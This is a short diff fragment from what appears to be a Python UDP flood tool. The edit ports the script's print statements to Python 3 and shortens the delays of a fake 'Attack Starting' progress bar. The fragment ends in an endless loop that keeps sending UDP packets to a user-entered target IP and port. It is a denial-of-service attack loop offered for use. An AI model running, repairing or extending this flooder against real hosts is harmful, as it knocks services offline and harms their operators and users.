@@ -37,16 +37,16 @@ port = input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+print( "[                    ] 0% ")
+time.sleep(2)
+print( "[=====               ] 25%")
+time.sleep(2)
+print( "[==========          ] 50%")
+time.sleep(2)
+print( "[===============     ] 75%")
+time.sleep(2)
+print( "[====================] 100%")
+time.sleep(2)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
